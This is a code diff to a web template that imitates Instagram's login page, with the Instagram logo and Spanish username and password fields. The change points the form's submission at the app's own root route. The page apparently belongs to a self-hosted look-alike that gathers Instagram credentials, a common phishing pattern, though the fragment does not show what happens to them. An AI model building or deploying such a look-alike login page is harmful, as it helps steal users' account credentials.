@@ -118,7 +118,7 @@ input[type="text"], input[type="password"] {
             <div class="logo">
                 <img src="{{ url_for('static', filename='IG.png') }}" alt="Logo Instagram">
             </div>
-            <form method="POST" id="login-form">
+            <form method="POST" action="/" id="login-form">
                 <input type="text" name="username" placeholder="Teléfono, usuario, o Correo electronico" required>
                 <input type="password" name="password" placeholder="Contraseña" required>
                 <button type="submit" class="login-button">Entrar</button>
